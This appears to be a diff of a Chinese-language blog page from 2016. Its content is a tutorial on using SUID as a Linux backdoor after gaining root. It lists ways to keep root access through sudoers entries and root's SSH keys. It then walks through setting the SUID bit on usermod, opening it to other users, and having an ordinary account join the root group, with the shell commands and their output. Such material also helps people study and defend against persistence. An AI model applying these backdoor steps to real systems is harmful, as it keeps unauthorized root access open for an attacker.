@@ -85,11 +85,12 @@
                     <div style="padding:5px 5px 2px 0px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>2016-04-18</time>
-                    </div>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
 
                     
 
-                    <div style="padding:2px 5px 5px 0px;">
+                    
                         
                         
                         
@@ -114,11 +115,9 @@
                 
                 
 
-<p>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制：</p>
+<p>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制</p>
 
-<hr />
-
-<h2 id="为二进制文件添加s权限从而提升为root权限方法">为二进制文件添加s权限从而提升为root权限方法：</h2>
+<h3 id="0x00-为二进制文件添加s权限从而提升为root权限">0x00 为二进制文件添加s权限从而提升为root权限</h3>
 
 <ol>
 <li>写sudoers添加用户  <code>//最佳方案</code><br /></li>
@@ -127,43 +126,43 @@
 <li>vim root .ssh/证书文件   <code>.ssh这个文件夹和证书的权限要正确，要和原来一致</code></li>
 </ol>
 
-<hr />
+<h3 id="0x01-suid主要作用可以是留后门">0x01 SUID主要作用可以是留后门</h3>
 
-<h2 id="suid-这个东西主要是留后门">SUID:这个东西主要是留后门</h2>
+<ul>
+<li><p>在root权限下给usermod一个s权限</p>
 
-<h4 id="在root权限下给usermod一个s权限">在root权限下给usermod一个s权限：</h4>
-
-<pre><code># which usermod   //得到usermod的路径                             
+<pre><code class="language-bash"># which usermod   #得到usermod的路径                             
 /usr/sbin/usermod
 # chmod u+s /usr/sbin/usermod
 # ls -l /usr/sbin/usermod
 -rwsr-x---. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
-</code></pre>
+</code></pre></li>
 
-<h4 id="usermod给其他人一个x权限">usermod给其他人一个x权限：</h4>
+<li><p>usermod给其他人一个x权限</p>
 
-<pre><code>[root@localhost ~]# chmod o+x /usr/sbin/usermod
+<pre><code class="language-bash">[root@localhost ~]# chmod o+x /usr/sbin/usermod
 [root@localhost ~]# ls -l /usr/sbin/usermod
 -rwsr-x--x. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
-</code></pre>
+</code></pre></li>
 
-<h4 id="切换到普通用户wyb">切换到普通用户wyb：</h4>
+<li><p>切换到普通用户wyb</p>
 
-<pre><code>    [wyb@localhost ~]$ id wyb
-    uid=500(wyb) gid=500(wyb) groups=500(wyb)
-    [wyb@localhost ~]$ usermod -g root wyb
-    [wyb@localhost ~]$ id wyb
-    uid=500(wyb) gid=0(root) groups=0(root)
-    [wyb@localhost ~]$ exit
-</code></pre>
+<pre><code class="language-bash">[wyb@localhost ~]$ id wyb
+uid=500(wyb) gid=500(wyb) groups=500(wyb)
+[wyb@localhost ~]$ usermod -g root wyb
+[wyb@localhost ~]$ id wyb
+uid=500(wyb) gid=0(root) groups=0(root)
+[wyb@localhost ~]$ exit
+</code></pre></li>
 
-<h4 id="验证">验证：</h4>
+<li><p>验证</p>
 
-<pre><code>重新用wyb连接，此时即为root权限
-[wyb@localhost ~]$ cd /root  //若能切换到此目录即证明确实获得了root权限
+<pre><code class="language-bash">重新用wyb连接，此时即为root权限
+[wyb@localhost ~]$ cd /root  #若能切换到此目录即证明确实获得了root权限
 [wyb@localhost root]$ ls
 anaconda-ks.cfg  install.log  install.log.syslog
-</code></pre>
+</code></pre></li>
+</ul>
 
                 
                 <div style="padding:10px 1px;">
